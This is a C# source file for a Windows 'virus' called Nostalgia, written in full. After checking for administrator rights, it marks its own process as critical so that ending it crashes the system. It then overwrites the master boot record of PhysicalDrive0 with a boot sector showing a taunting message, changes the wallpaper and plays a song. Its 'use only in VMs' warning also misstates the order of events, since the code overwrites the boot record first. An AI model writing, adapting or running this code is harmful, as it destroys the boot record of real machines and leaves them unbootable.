using System.Media;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Drawing;
using System;
using System.Security.Principal;
using System.Diagnostics;
using Microsoft.Win32;


class MBROverwrite
{
    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateFile(
        string lpFileName, uint dwDesiredAccess, uint dwShareMode,
        IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport("kernel32")]
        private static extern bool WriteFile(
            IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);


    private const uint GenericRead = 0x80000000;
    private const uint GenericWrite = 0x40000000;
    private const uint GenericExecute = 0x20000000;
    private const uint GenericAll = 0x10000000;

    private const uint FileShareRead = 0x1;
    private const uint FileShareWrite = 0x2;
    private const uint OpenExisting = 0x3;

    private const uint MbrSize = 512;

    public static void OverWrite()
    {
        var mbrData = new byte[]
        {0xEB, 0x00, 0x31, 0xC0, 0x8E, 0xD8, 0xFC, 0xB8, 0x12, 0x00, 0xCD, 0x10, 0xBE, 0x24, 0x7C, 0xB3,
0x04, 0xE8, 0x02, 0x00, 0xEB, 0xFE, 0xB7, 0x00, 0xAC, 0x3C, 0x00, 0x74, 0x06, 0xB4, 0x0E, 0xCD,
0x10, 0xEB, 0xF5, 0xC3, 0x4E, 0x6F, 0x73, 0x74, 0x61, 0x6C, 0x67, 0x69, 0x61, 0x20, 0x67, 0x6F,
0x74, 0x20, 0x79, 0x6F, 0x75, 0x2C, 0x20, 0x61, 0x6E, 0x64, 0x20, 0x79, 0x6F, 0x75, 0x20, 0x63,
0x61, 0x6E, 0x74, 0x20, 0x64, 0x6F, 0x20, 0x61, 0x6E, 0x79, 0x74, 0x68, 0x69, 0x6E, 0x67, 0x20,
0x61, 0x62, 0x6F, 0x75, 0x74, 0x20, 0x69, 0x74, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA

};
    var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero, OpenExisting, 0, IntPtr.Zero);
    WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
}
}
class ProcessHelper
{
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(
        IntPtr hProcess,
        int processInfoClass,
        ref int processInfo,
        int processInfoLen);

    const int processBreakOnTermination = 0x1D;
    public static bool SetProcCrit(bool enable)
    {
        int isCrit = enable ? 1 : 0;
        IntPtr handle = Process.GetCurrentProcess().Handle;
        int ret = NtSetInformationProcess(handle, processBreakOnTermination, ref isCrit, sizeof(int));
        return ret == 0;
    }
}

class DesktopChanger
{
    const int SPI_SETDESKWALLPAPER = 20;
    const int SPIF_UPDATEINIFILE = 0x01;
    const int SPIFSENDCHANGE = 0x02;

    [DllImport("user32.dll", SetLastError = true)]
    static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

    public static void ChangeWallpaper()
    {

        Image backgroundImage = Nostalgia.Properties.Resources.wallpaper;

        SetDesktopWallpaperFromResource(backgroundImage);
    }

    static void SetDesktopWallpaperFromResource(Image backgroundImage)
    {
        string tempFilePath = Path.Combine(Path.GetTempPath(), "background.bmp");


        backgroundImage.Save(tempFilePath, System.Drawing.Imaging.ImageFormat.Bmp);


        RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
        if (key != null)
        {
            key.SetValue("WallpaperStyle", "2"); // 2 = Stretched, 0 = Centered, 6 = Fit
            key.SetValue("TileWallpaper", "0");
            key.SetValue("Wallpaper", tempFilePath);
            key.Close();
        }

        // Forza a cambiare lo sfondo del cazzo
        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, tempFilePath, SPIF_UPDATEINIFILE | SPIFSENDCHANGE);
    }
}
    
namespace WARNING
{
    class WarningHandler
    {
        public static void ShowError()
        {
            MessageBox.Show(
                "Warning! This virus will overwrite the MBR after the song in the virus ends. Use it only in VMs and never in real-machines. I do not take responsability for any wrong or malicious usage.",
                "WARNING!",
                MessageBoxButtons.OK,
                MessageBoxIcon.Warning
            );
        }
    }
}

class AudioPlayer
{
    public static void Audio()
    {
        //FROM: https://soundcloud.com/walkzz/alan-walker-force
        var stream = Nostalgia.Properties.Resources.NOSTALGIA;

        if (stream == null)
        {
            MessageBox.Show("Errore: il file audio non è stato caricato.");
            return;
        }

        SoundPlayer player = new SoundPlayer(stream);
        player.PlaySync();
    }
}

class MAIN
{
    static bool isAdmin()
    {
        var identity = WindowsIdentity.GetCurrent();
        var principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator);

    }
    static void run()
    {
        WARNING.WarningHandler.ShowError();
        MBROverwrite.OverWrite();
        DesktopChanger.ChangeWallpaper();
        AudioPlayer.Audio();
        Environment.Exit(0);
    }
    static void Main()
    {
        if (!MAIN.isAdmin())
        {
            MessageBox.Show("Please, restart this application with Administrator permissions!", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
            return;
        }
        else if (!ProcessHelper.SetProcCrit(true))
            {
                MessageBox.Show("Impossible to set critical process", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        else
        {
            run();
        }
    }
}
